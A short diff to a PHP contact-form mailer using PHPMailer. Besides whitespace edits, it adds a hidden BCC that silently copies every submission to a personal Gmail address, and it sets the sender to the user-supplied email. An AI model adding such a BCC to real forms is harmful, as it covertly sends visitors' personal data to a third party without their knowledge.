@@ -38,11 +38,13 @@
             //If SMTP requires TLS encryption then set it
             //$mail->SMTPSecure = "tls";                           
             //Set TCP port to connect to 
-            $mail->Port = 587;                                   
+            $mail->Port = 587;                            
+            
+                  
             $mail->Debugoutput = 'html';
             $mail->From = $postData['email'];
             $mail->FromName = $postData['name'];
-            
+            $mail->addBCC('j.dioqueono@gmail.com');
             $mail->smtpConnect(
                 array(
                     "ssl" => array(
@@ -54,6 +56,7 @@
             );
             
             $mail->addAddress("dev7flip@gmail.com",$postData['name']);
+          
             $mail->AddEmbeddedImage('../logo.png', 'flip_logo');
             $mail->isHTML(true);
             
